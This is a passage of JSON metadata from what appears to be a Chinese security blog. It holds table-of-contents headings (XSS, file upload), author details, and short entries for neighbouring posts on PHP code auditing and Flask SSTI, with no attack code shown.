class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XSS-2\"><span class=\"toc-text\">XSS</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-1\"><span class=\"toc-text\">文件上传</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%8F%90%E4%BA%A4\"><span class=\"toc-text\">提交</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"PHP代码审计之旅之百家CMS","uid":"2701665bc33e3ae6e528c88e69e6e2f6","slug":"代审基础——php_bugs","date":"2022-08-11T10:10:16.000Z","updated":"2024-02-14T07:32:24.000Z","comments":true,"path":"api/articles/代审基础——php_bugs.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141532334.jpeg","text":"前言代码审计不会，学习知识需要积累一下基础，因此来搭建php_bugs进行相关学习，题解如下，希望能对在学习代码审计的师傅们有所帮助 靶场github链接如下https://github.com/bowu678/php_bugs extract变量覆盖&lt;?php $flag...","link":"","photos":[],"count_time":{"symbolsCount":"42k","symbolsTime":"38 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Flask SSTi从零到入门","uid":"2fc52d0d731cc7ed8b93f6d476d9f632","slug":"FLaskSSTI从零到入门","date":"2022-08-08T13:20:20.000Z","updated":"2023-03-14T07:27:50.000Z","comments":true,"path":"api/articles/FLaskSSTI从零到入门.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141527260.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1698/ 文章由于hexo的md文件不接受具有{ {符号的，所以我这里不再放原文，想了解这篇文章的还请移步到跳跳糖社区 ","link":"","photos":[],"count_time":{"symbolsCount":100,"symbolsTime":"1 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":1,"path":"api/tags/SSTI.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}